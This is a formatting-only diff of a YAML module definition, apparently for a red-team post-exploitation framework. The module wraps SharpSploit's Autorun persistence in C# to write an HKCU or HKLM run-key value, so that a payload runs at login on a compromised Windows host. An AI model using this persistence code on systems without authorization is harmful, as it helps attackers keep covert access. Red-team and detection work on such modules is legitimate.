@@ -4,7 +4,7 @@ authors:
     handle: Cx01N
     link: https://twitter.com/Cx01N_
 description: |
-  Installs an autorun value in HKCU or HKLM to execute a payload. Once the key has been installed the compromised host will execute the designated program upon login.  TargetHive specifies whether to modify the userland registry key or elevated Machine key.
+  Installs an autorun value in HKCU or HKLM to execute a payload. Once the key has been installed the compromised host will execute the designated program upon login. TargetHive specifies whether to modify the userland registry key or elevated Machine key.
 tactics: [TA0003]
 techniques: [T1547.001]
 background: false
@@ -19,9 +19,7 @@ options:
     required: true
     value: CurrentUser
     strict: true
-    suggested_values:
-      - CurrentUser
-      - LocalMachine 
+    suggested_values: [CurrentUser, LocalMachine]
   - name: Name
     description: Name for the registy value.
     required: true
@@ -36,14 +34,11 @@ options:
     suggested_values: []
 csharp:
   UnsafeCompile: false
-  CompatibleDotNetVersions:
-    - Net35
-    - Net40
+  CompatibleDotNetVersions: [Net35, Net40]
   Code: |
     using System;
     using System.IO;
     using SharpSploit.Persistence;
-
     public static class Program
     {
         public static void Main(string[] args)
@@ -51,11 +46,9 @@ csharp:
             string targetHive = args.Length > 0 ? args[0] : "";
             string name = args.Length > 1 ? args[1] : "";
             string value = args.Length > 2 ? args[2] : "";
-
             string result = InstallAutorunPersistence(targetHive, name, value);
             Console.WriteLine(result);
         }
-
         public static string InstallAutorunPersistence(string targetHive, string name, string value = "")
         {
             using (StringWriter stringWriter = new StringWriter())
@@ -68,7 +61,6 @@ csharp:
                     {
                         return "Autorun Persistence failed. Invalid Target Hive specified.";
                     }
-
                     if (Autorun.InstallAutorun(targetHive, value, name))
                     {
                         stringWriter.WriteLine("Startup Persistence succeeded for: " + name);
@@ -82,7 +74,6 @@ csharp:
                 {
                     stringWriter.WriteLine(e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
                 }
-
                 return stringWriter.ToString();
             }
         }
@@ -92,9 +83,7 @@ csharp:
       Description: SharpSploit is a library for C# post-exploitation modules.
       Location: SharpSploit\SharpSploit\
       Language: CSharp
-      CompatibleDotNetVersions:
-        - Net35
-        - Net40
+      CompatibleDotNetVersions: [Net35, Net40]
       ReferenceAssemblies:
         - Name: System.Management.Automation.dll
           Location: net35\System.Management.Automation.dll
